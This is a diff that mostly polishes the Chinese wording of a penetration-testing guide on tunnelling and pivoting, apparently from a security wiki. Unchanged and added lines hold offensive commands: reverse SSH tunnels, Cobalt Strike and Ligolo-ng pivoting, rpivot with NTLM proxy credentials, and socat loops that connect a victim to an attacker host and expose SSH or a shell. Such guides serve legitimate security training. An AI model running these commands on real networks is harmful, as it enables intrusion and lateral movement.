@@ -82,7 +82,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPN-Tunnel
 
-您需要**在两个设备上具有root权限**（因为您将要创建新的接口），并且sshd配置必须允许root登录：\
+您需要**在两个设备上具有root权限**（因为您将创建新的接口），并且sshd配置必须允许root登录：\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -104,7 +104,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ## SSHUTTLE
 
 您可以通过 **ssh** 将所有 **流量** 通过主机 **隧道** 到 **子网络**。\
-例如，转发所有流向 10.10.10.0/24 的流量。
+例如，转发所有发送到 10.10.10.0/24 的流量。
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -174,7 +174,7 @@ To note:
 ### rPort2Port local
 
 {% hint style="warning" %}
-在这种情况下，**端口在beacon主机中打开**，而不是在团队服务器中，**流量被发送到Cobalt Strike客户端**（而不是团队服务器），然后从那里发送到指定的主机:端口
+在这种情况下，**端口在beacon主机上打开**，而不是在团队服务器上，**流量发送到Cobalt Strike客户端**（而不是团队服务器），然后从那里发送到指定的主机:端口
 {% endhint %}
 ```
 rportfwd_local [bind port] [forward host] [forward port]
@@ -243,6 +243,12 @@ listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
 # Display the currently running listeners on the agent -- Attacker
 listener_list
 ```
+### 访问代理的本地端口
+```bash
+# Establish a tunnel from the proxy server to the agent
+# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
+interface_add_route --name "ligolo" --route 240.0.0.1/32
+```
 ## Rpivot
 
 [https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)
@@ -256,7 +262,7 @@ attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
 ```
-通过 **NTLM 代理** 进行枢轴
+通过 **NTLM 代理** 进行枢转
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
 ```
@@ -300,8 +306,6 @@ victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
-[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
-
 ### SSL Socat Tunnel
 
 **/bin/sh 控制台**
@@ -322,7 +326,7 @@ victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.
 ```
 ### Remote Port2Port
 
-将本地SSH端口（22）连接到攻击者主机的443端口
+将本地 SSH 端口 (22) 连接到攻击者主机的 443 端口
 ```bash
 attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
 victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
@@ -380,7 +384,7 @@ netstat -antb | findstr 1080
 
 您可以使用 [**Proxifier**](https://www.proxifier.com/) 使 Windows GUI 应用程序通过代理进行导航。\
 在 **Profile -> Proxy Servers** 中添加 SOCKS 服务器的 IP 和端口。\
-在 **Profile -> Proxification Rules** 中添加要代理的程序名称和要代理的 IP 连接。
+在 **Profile -> Proxification Rules** 中添加要代理的程序名称和要代理的 IP 的连接。
 
 ## NTLM 代理绕过
 
@@ -403,7 +407,7 @@ Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
 现在，如果你在受害者的**SSH**服务上设置监听端口为443。你可以通过攻击者的2222端口连接到它。\
-你也可以使用一个连接到localhost:443的**meterpreter**，而攻击者在2222端口监听。
+你也可以使用一个连接到localhost:443的**meterpreter**，攻击者在2222端口监听。
 
 ## YARP
 
@@ -452,7 +456,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### 更改 proxychains DNS
 
-Proxychains 拦截 `gethostbyname` libc 调用，并通过 socks 代理隧道 tcp DNS 请求。默认情况下，proxychains 使用的 DNS 服务器是 **4.2.2.2**（硬编码）。要更改它，请编辑文件： _/usr/lib/proxychains3/proxyresolv_ 并更改 IP。如果您在 **Windows 环境** 中，可以设置 **域控制器** 的 IP。
+Proxychains 拦截 `gethostbyname` libc 调用，并通过 socks 代理隧道 tcp DNS 请求。默认情况下，proxychains 使用的 DNS 服务器是 **4.2.2.2**（硬编码）。要更改它，请编辑文件：_/usr/lib/proxychains3/proxyresolv_ 并更改 IP。如果您在 **Windows 环境** 中，可以设置 **域控制器** 的 IP。
 
 ## Go 中的隧道
 
